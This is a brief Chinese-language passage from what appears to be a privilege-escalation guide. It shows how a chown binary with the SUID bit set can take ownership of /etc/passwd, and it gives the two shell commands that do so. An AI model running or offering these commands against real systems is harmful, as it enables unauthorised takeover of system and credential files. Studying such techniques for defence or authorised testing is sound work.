如果 chown 拥有 S 权限，我们可以使用它以 root 权限修改其他文件所属用户和组。
例如使用 chown 修改/etc/passwd 文件所属：
```
LFILE=/etc/passwd
./chown $(id -un):$(id -gn) $LFILE
```
然后就可以读取 passwd 文件。
